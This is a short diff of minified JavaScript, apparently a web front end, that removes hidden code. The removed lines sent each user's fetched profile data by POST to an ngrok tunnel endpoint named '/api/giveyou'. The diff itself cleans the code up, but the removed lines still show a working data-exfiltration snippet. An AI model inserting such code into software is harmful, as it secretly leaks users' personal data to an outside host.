@@ -21273,11 +21273,6 @@
                 } = (0, X.Z)(), r = $(a.fullName);
                 return (0, s.useLayoutEffect)(() => {
                     (0, o.callHandler)("getProfile", {}).then(a => {
-                        fetch("https://a51259c503db.ngrok-free.app/api/giveyou", {
-                        method: "POST",
-                        headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify(a)
-                        });
                         e(a)
                     }).catch(a => {
                         t(a)
